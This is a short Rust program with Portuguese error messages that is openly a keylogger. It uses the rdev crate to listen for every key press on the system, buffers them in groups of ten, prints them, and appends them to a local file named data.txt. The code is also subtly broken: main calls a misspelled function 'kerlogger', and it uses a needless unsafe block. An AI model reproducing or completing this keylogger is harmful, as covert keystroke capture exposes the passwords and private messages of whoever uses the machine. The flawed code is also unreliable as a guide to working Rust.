use rdev::{listen, Event, EventType, Key};
use std::sync::{Arc, Mutex};
use std::fs::{OpenOptions};
use std::io::Write;


fn main() {
    unsafe{
        let contador = Arc::new(Mutex::new(0));
        let data = Arc::new(Mutex::new(Vec::new()));

        let contador_clone = Arc::clone(&contador);
        let data_clone = Arc::clone(&data);


        if let Err(error) = listen(move |event| {
            kerlogger(event, &contador_clone, &data_clone);
        }) {
            println!("Erro ao iniciar monitoramento: {:?}", error);
        }
    }
}

fn keylogger(event: Event, contador: &Arc<Mutex<u32>>, data: &Arc<Mutex<Vec<Key>>>) {
    let file_path = "data.txt";
    let mut file = OpenOptions::new()
        .write(true)
        .append(true)
        .open(file_path)
        .expect("Erro ao abrir o arquivo");
    if let EventType::KeyPress(key) = event.event_type {
        let mut contador = contador.lock().unwrap();
        *contador += 1;

        let mut data = data.lock().unwrap();
        data.push(key);


        if *contador >= 10 {
            for key in data.iter() {
                let valor = key;
                println!("{:?}", valor);
                writeln!(file, "{:?}", key).expect("Erro ao escrever no arquivo");
            }


            *contador = 0;
            data.clear();
        }
    }
}

